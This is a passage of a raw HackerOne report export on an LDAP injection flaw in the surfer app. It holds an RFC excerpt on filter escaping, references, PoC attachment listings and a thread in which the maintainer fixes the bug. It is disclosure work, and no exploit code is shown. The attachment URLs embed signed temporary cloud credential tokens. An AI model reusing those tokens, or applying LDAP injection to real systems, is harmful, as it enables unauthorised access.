href=\"/redirect?url=https%3A%2F%2Ftools.ietf.org%2Fsearch%2Frfc4515%23section-3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://tools.ietf.org/search/rfc4515#section-3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e ):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    The rule ensures that the entire filter string is a\n    valid UTF-8 string and provides that the octets that represent the\n    ASCII characters \u0026quot;*\u0026quot; (ASCII 0x2a), \u0026quot;(\u0026quot; (ASCII 0x28), \u0026quot;)\u0026quot; (ASCII\n    0x29), \u0026quot;\u0026quot; (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n    backslash \u0026quot;\u0026quot; (ASCII 0x5c) followed by the two hexadecimal digits\n    representing the value of the encoded octet.\n\n    This simple escaping mechanism eliminates filter-parsing ambiguities\n    and allows any filter that can be represented in LDAP to be\n    represented as a NUL-terminated string. Other octets that are part\n    of the set may be escaped using this mechanism, for example,\n    non-printing ASCII characters.\n\n    For AssertionValues that contain UTF-8 character data, each octet of\n    the character to be escaped is replaced by a backslash and two hex\n    digits, which form a single octet in the code of the character. For\n    example, the filter checking whether the \u0026quot;cn\u0026quot; attribute contained a\n    value with the character \u0026quot;\u0026quot; anywhere in it would be represented as\n    \u0026quot;(cn=\\2a*)\u0026quot;.\n\n    As indicated by the rule, implementations MUST escape\n    all octets greater than 0x7F that are not part of a valid UTF-8\n    encoding sequence when they generate a string representation of a\n    search filter. Implementations SHOULD accept as input strings that\n    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n    not clearly define the term \u0026quot;string representation\u0026quot; (and in\n    particular did not mention that the string representation of an LDAP\n    search filter is a string of UTF-8-encoded Unicode characters).\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eSome helpful resources I used for this research:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FLDAP_injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLDAP injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fldap.com%2Fldap-filters%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLDAP Filters\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.blackhat.com%2Fpresentations%2Fbh-europe-08%2FAlonso-Parada%2FWhitepaper%2Fbh-eu-08-alonso-parada-WP.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBlackHat: LDAP Injection \u0026amp; Blind LDAP Injection\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fldap.com%2F2018%2F05%2F04%2Funderstanding-and-defending-against-ldap-injection-attacks%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eUnderstanding and Defending Against LDAP Injection Attacks\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fcheatsheetseries.owasp.org%2Fcheatsheets%2FLDAP_Injection_Prevention_Cheat_Sheet.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLDAP Injection Prevention Cheat Sheet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fldapjs.org%2Ffilters.html%23orfilter\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLdapjs - orfilter\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eMy setup:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v14.2.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: [N] \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: [N] \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThank you for your time.\u003c/p\u003e\n\n\u003cp\u003ebest regards,\u003c/p\u003e\n\n\u003cp\u003ed3lla\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDenial of service\u003c/p\u003e\n","weakness":{"id":99,"name":"LDAP Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":881310,"file_name":"run_safe.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wTX76bpZALUnSpLW5HUjd8d7?response-content-disposition=attachment%3B%20filename%3D%22run_safe.py%22%3B%20filename%2A%3DUTF-8%27%27run_safe.py\u0026response-content-type=text%2Fx-python-script\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070943Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=c31409d472478843a4bba0060f93368bdbe87d05bca12bbe63eb5aded06b6264","file_size":282,"type":"text/x-python-script"},{"id":881311,"file_name":"ldapjstestserver.js","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6M54rGLh3V1aZhYsLuXMuqnX?response-content-disposition=attachment%3B%20filename%3D%22ldapjstestserver.js%22%3B%20filename%2A%3DUTF-8%27%27ldapjstestserver.js\u0026response-content-type=application%2Fx-perl\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070943Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=1c4a7b4af83c2a6c852ece648b9354da6ca7a75f9dfffc354d1abc000a703c71","file_size":5346,"type":"application/x-perl"},{"id":881312,"file_name":"run.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/btBL7Q65huMNego4nVb5p2AK?response-content-disposition=attachment%3B%20filename%3D%22run.py%22%3B%20filename%2A%3DUTF-8%27%27run.py\u0026response-content-type=text%2Fx-python-script\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070943Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=29f62c6a97959f1b425e37318a9bbb5deb08ac82f2ce1528ae9cf5e5aa72ca13","file_size":260,"type":"text/x-python-script"},{"id":881315,"file_name":"poc.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3Ye5mgaQdPKPn9yNzGtceDcB?response-content-disposition=attachment%3B%20filename%3D%22poc.mov%22%3B%20filename%2A%3DUTF-8%27%27poc.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070943Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=2543ba4fa5961032b13a9fd3ef084c1a4096d45afff15aa837d4e262077db650","file_size":57057039,"type":"video/quicktime"}],"allow_singular_disclosure_at":"2020-09-20T20:49:19.898Z","allow_singular_disclosure_after":-8590823.588602737,"singular_disclosure_allowed":true,"vote_count":7,"voters":["mehmettcan","prasanthpro","anas2003","dawck3r","surya_m2003","aizen07","airim-coder"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8429951,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI hope everyone is staying safe :)\n\nIs there any update?\n\nThank you for your patience and have a nice day,\nd3lla\n","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI hope everyone is staying safe :)\u003c/p\u003e\n\n\u003cp\u003eIs there any update?\u003c/p\u003e\n\n\u003cp\u003eThank you for your patience and have a nice day,\u003cbr\u003e\nd3lla\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-27T15:59:32.280Z","updated_at":"2020-06-27T15:59:32.280Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8563989,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\nI hope everyone is staying safe :)\n\nIs there any update?\n\nThank you for your patience and have a nice day,\nd3lla\n","markdown_message":"\u003cp\u003eHi,\u003cbr\u003e\nI hope everyone is staying safe :)\u003c/p\u003e\n\n\u003cp\u003eIs there any update?\u003c/p\u003e\n\n\u003cp\u003eThank you for your patience and have a nice day,\u003cbr\u003e\nd3lla\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-10T19:18:58.368Z","updated_at":"2020-07-10T19:18:58.368Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8828346,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this. I will do the next steps.","markdown_message":"\u003cp\u003eThanks for reporting this. I will do the next steps.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-02T11:03:34.911Z","updated_at":"2020-08-02T11:03:34.911Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8951139,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-16T20:29:55.391Z","updated_at":"2020-08-16T20:29:55.391Z","actor":{"username":"nebulon","cleared":false,"url":"/nebulon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8951154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thanks for inviting me here. I also got the same issue with my meemo app so I will apply the same fix there.","markdown_message":"\u003cp\u003eHi, thanks for inviting me here. I also got the same issue with my meemo app so I will apply the same fix there.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-16T20:34:35.375Z","updated_at":"2020-08-16T20:34:35.375Z","actor":{"username":"nebulon","cleared":false,"url":"/nebulon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8951333,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This has now been fixed with https://git.cloudron.io/cloudron/surfer/-/commit/060805d087712d5d7d82f0a0b948cbb2526ac907\n\nIt is the first time I am using hackerone, so I am not sure how to proceed further here.","markdown_message":"\u003cp\u003eThis has now been fixed with \u003ca title=\"https://git.cloudron.io/cloudron/surfer/-/commit/060805d087712d5d7d82f0a0b948cbb2526ac907\" href=\"/redirect?url=https%3A%2F%2Fgit.cloudron.io%2Fcloudron%2Fsurfer%2F-%2Fcommit%2F060805d087712d5d7d82f0a0b948cbb2526ac907\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://git.cloudron.io/cloudron/surfer/-/commit/060805d087712d5d7d82f0a0b948cbb2526ac907\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt is the first time I am using hackerone, so I am not sure how to proceed further here.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-16T21:31:37.527Z","updated_at":"2020-08-16T21:31:37.527Z","actor":{"username":"nebulon","cleared":false,"url":"/nebulon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/aB4HRBYPt64phWJLezBaHSBT/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8951652,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for providing a patch @nebulon.\n@d3lla can you confirm that this resolves the issue?","markdown_message":"\u003cp\u003eThanks for providing a patch \u003ca href=\"/nebulon\"\u003e@nebulon\u003c/a\u003e.\u003cbr\u003e\n\u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e can you confirm that this resolves the issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-17T00:03:24.507Z","updated_at":"2020-08-17T00:03:24.507Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9003426,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nebulon and @danielruf,\n\nSorry for my late reply.\n\n@nebulon thanks for your prompt reply and for the fix.\n\nYour changes seems to fix the problem.\nI run the previous steps of the PoC and I was not able to reproduce the previous reported result.\nI attached a PoC video.\n{F958371}\n\nThank you for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nebulon\"\u003e@nebulon\u003c/a\u003e and \u003ca href=\"/danielruf\"\u003e@danielruf\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eSorry for my late reply.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/nebulon\"\u003e@nebulon\u003c/a\u003e thanks for your prompt reply and for the fix.\u003c/p\u003e\n\n\u003cp\u003eYour changes seems to fix the problem.\u003cbr\u003e\nI run the previous steps of the PoC and I was not able to reproduce the previous reported result.\u003cbr\u003e\nI attached a PoC video.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"poc_fix_surfer.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tUUWew9MTL332fRAraDE1p8Z?response-content-disposition=attachment%3B%20filename%3D%22poc_fix_surfer.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_fix_surfer.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070943Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=f91c09958e3707ef324fea46751658be78d95e4a4f0370db61159aaad285b32f\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" 